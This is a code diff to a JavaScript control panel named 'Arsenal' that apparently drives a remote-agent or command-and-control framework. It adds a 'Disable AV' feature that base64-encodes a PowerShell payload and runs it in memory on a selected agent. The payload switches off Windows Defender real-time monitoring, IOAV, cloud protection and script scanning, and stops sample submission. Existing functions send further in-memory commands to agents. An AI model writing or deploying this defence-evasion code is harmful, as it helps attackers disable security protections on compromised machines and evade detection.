@@ -470,6 +470,7 @@ async function stopChaosSpam() {
     if (!agentId) return;
 
     // Kill processes with #RAMP_SPAM in command line
+    // Note: Get-WmiObject is slow but reliable for command line args.
     const script = `Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*#RAMP_SPAM*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }`;
 
     try {
@@ -504,4 +505,54 @@ async function removePersistence() {
         await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
         showNotification('Success', 'Registry cleaned.');
     } catch (e) { showNotification('Error', e.message); }
+}
+
+// ==========================================
+// Disable AV Logic (Admin Required)
+// ==========================================
+
+function configureDisableAV() {
+    console.log('[Arsenal] Configure Disable AV clicked');
+    const agentId = window.selectedAgentId || selectedAgentId;
+
+    if (!agentId) {
+        showNotification('Error', 'Please select an agent first!');
+        return;
+    }
+
+    window.disableAVTargetId = agentId;
+    document.getElementById('disableAVModal').style.display = 'flex';
+}
+
+function closeDisableAVModal() {
+    document.getElementById('disableAVModal').style.display = 'none';
+}
+
+async function triggerDisableAV() {
+    const agentId = window.disableAVTargetId;
+    closeDisableAVModal();
+
+    console.log(`[Arsenal] Disabling AV for Agent ${agentId} (Hope we have Admin!)`);
+
+    // PowerShell payload to disable Real-time Monitoring and Cloud Protection
+    // Note: This trigger requires High Integrity (Admin)
+    const psScript = `
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableCloudProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+    Write-Output "Defender should be disabled if Admin."
+    `;
+
+    try {
+        const encoded = utf8_to_b64_utf16le(psScript);
+        const cmd = `run-memory powershell ${encoded}`;
+
+        await sendCommandToAgent(agentId, cmd);
+        showNotification('Success', 'Disable AV Command Sent! 🛡️💀');
+    } catch (error) {
+        console.error('[Arsenal] Failed to disable AV:', error);
+        showNotification('Error', `Failed: ${error.message}`);
+    }
 }
